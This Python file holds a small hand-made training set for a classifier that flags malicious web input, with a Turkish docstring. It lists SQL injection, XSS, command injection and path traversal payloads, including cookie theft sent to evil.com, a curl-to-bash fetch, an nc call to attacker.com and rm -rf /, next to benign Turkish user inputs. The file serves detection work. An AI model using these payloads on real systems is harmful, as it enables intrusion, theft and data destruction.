"""
ML siniflandiricisi icin kucuk, elle derlenmis egitim veri seti.

ONEMLI: Bu, gercek bir dunyanin tum cesitliligini kapsayan devasa bir veri
seti degil - kucuk ama cesitli bir baslangic noktasi. Faz 3'te gercek
honeypot trafiginden biriken etiketli veriyle genisletilmesi planlaniyor
(bkz. docs/ROADMAP.md). Modelin amaci kural motorunun YERINE gecmek degil,
ona EK bir sinyal saglamak - bu yuzden kucuk bir veri setiyle baslamak
kabul edilebilir bir mimari tercihtir.
"""

MALICIOUS_SAMPLES = [
    # SQL Injection
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT username, password FROM users--",
    "1' UNION SELECT null, null, null--",
    "x'; DROP TABLE users;--",
    "1 OR 1=1",
    "' OR 'a'='a",
    "admin'/*",
    "1' AND SLEEP(5)--",
    "' OR ''='",
    "'; EXEC xp_cmdshell('dir')--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL, version()--",
    # XSS
    "<script>alert(1)</script>",
    "<script>document.location='http://evil.com/'+document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert('xss')>",
    "\"><script>alert(1)</script>",
    "<a href=javascript:alert(1)>click</a>",
    # Command Injection
    "; cat /etc/passwd",
    "&& whoami",
    "| nc attacker.com 4444",
    "$(curl http://evil.com/shell.sh | bash)",
    "`whoami`",
    "; rm -rf /",
    "|| ping -c 10 127.0.0.1",
    "; wget http://evil.com/malware -O /tmp/m",
    # Path Traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../etc/shadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Karma / obfuscated
    "un'+'ion sel'+'ect",
    "1;select*from users",
    "<ScRiPt>alert(1)</sCriPt>",
    "' oR '1'='1' -- -",
]

BENIGN_SAMPLES = [
    "emirhan",
    "arkadasim123",
    "merhaba dunya",
    "kullanici adi: admin",
    "sifremi unuttum",
    "istanbul, turkiye",
    "bu urun cok guzel, tesekkurler",
    "siparisim ne zaman gelir?",
    "topkapi universitesi bilgi guvenligi",
    "2026-08-13",
    "emir@icloud.com",
    "+90 555 123 45 67",
    "python ile web gelistirme",
    "merhaba, nasilsiniz?",
    "urun adedi: 3",
    "adres: ataturk caddesi no:5",
    "yorumum: harika bir hizmet",
    "arama: laptop fiyatlari",
    "kullanici profili guncellendi",
    "yeni sifre: Guclu-Sifre-2026",
    "mesaj: yarin gorusuruz",
    "siparis numarasi 48213",
    "urun aciklamasi cok detayli",
    "istek: fatura bilgilerimi guncelle",
    "not: toplantiyi 15:00'e alalim",
    "kayit ol",
    "giris yap",
    "ürün sepete eklendi",
    "teslimat adresi degistirildi",
    "hesap ayarlari",
    "yardim merkezi",
    "sikca sorulan sorular",
    "gizlilik politikasi",
    "kullanim kosullari",
    "iletisim formu",
    "kariyer firsatlari",
    "hakkimizda",
    "sepetim bos",
    "favorilerim",
    "siparis takibi",
]
